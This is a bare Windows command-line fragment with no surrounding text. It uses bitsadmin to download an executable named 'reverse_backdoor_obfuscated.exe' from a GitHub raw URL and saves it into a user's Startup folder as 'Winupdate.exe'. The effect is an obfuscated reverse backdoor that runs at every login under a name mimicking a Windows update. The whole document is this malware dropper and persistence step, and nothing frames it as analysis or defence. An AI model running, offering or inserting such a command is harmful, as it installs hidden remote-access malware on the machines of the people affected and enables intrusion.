...
bitsadmin /transfer Packages /download /priority foreground https://github.com/ezq-c/ezqc/raw/main/reverse_backdoor_obfuscated.exe "C:\Users\tommy\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
